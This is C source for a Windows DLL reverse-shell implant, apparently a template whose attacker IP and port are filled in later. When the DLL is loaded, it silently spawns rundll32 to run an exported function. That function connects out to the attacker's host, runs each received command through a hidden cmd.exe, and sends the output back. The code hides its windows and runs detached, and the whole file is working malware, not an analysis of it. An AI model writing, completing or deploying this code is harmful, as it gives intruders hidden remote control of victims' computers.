#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

static char g_ip[] = "__IP__";

static int readline(SOCKET s, char *buf, int max) {
    int off = 0, n;
    while (off < max-1) {
        n = recv(s, buf+off, 1, 0);
        if (n <= 0) return -1;
        if (buf[off] == '\n') break;
        off++;
    }
    buf[off] = '\0';
    while (off > 0 && (buf[off-1]=='\r'||buf[off-1]=='\n')) buf[--off]='\0';
    return off;
}

static void runcmd(SOCKET s, const char *cmdbuf) {
    SECURITY_ATTRIBUTES sattr = {sizeof(sattr), NULL, TRUE};
    HANDLE rd, wr;
    if (!CreatePipe(&rd, &wr, &sattr, 0)) return;
    SetHandleInformation(rd, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = wr; si.hStdError = wr;
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
    char cmdline[8192];
    _snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\"", cmdbuf);
    if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        send(s, "ERR:CreateProcess\r\n", 19, 0);
        CloseHandle(rd); CloseHandle(wr); return;
    }
    CloseHandle(wr);
    CloseHandle(pi.hThread);
    char buf[4096]; DWORD nr;
    while (ReadFile(rd, buf, sizeof(buf), &nr, NULL) && nr > 0)
        send(s, buf, nr, 0);
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(rd);
}

__declspec(dllexport) void CALLBACK RunShell(HWND hw, HINSTANCE hi, LPSTR cmd, int show) {
    (void)hw; (void)hi; (void)cmd; (void)show;
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return;
    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return; }
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(__PORT__);
    sa.sin_addr.s_addr = inet_addr(g_ip);
    if (connect(s, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        closesocket(s); WSACleanup(); return;
    }
    send(s, "READY\r\n", 7, 0);
    char cmdbuf[4096];
    while (readline(s, cmdbuf, sizeof(cmdbuf)) >= 0) {
        if (cmdbuf[0] == '\0') continue;
        if (_stricmp(cmdbuf, "exit") == 0) break;
        runcmd(s, cmdbuf);
        send(s, "__CMDEND__\r\n", 12, 0);
    }
    closesocket(s); WSACleanup();
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID res) {
    (void)res;
    if (r == DLL_PROCESS_ATTACH) {
        char exe[MAX_PATH];
        GetModuleFileNameA(NULL, exe, MAX_PATH);
        if (strstr(exe, "rundll32") || strstr(exe, "Rundll32"))
            return TRUE;
        char dllpath[MAX_PATH];
        GetModuleFileNameA(h, dllpath, MAX_PATH);
        char spawn[MAX_PATH + 64];
        _snprintf(spawn, sizeof(spawn), "rundll32.exe \"%s\",RunShell", dllpath);
        STARTUPINFOA si;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi;
        ZeroMemory(&pi, sizeof(pi));
        CreateProcessA(NULL, spawn, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi);
        if (pi.hThread) CloseHandle(pi.hThread);
        if (pi.hProcess) CloseHandle(pi.hProcess);
    }
    return TRUE;
}
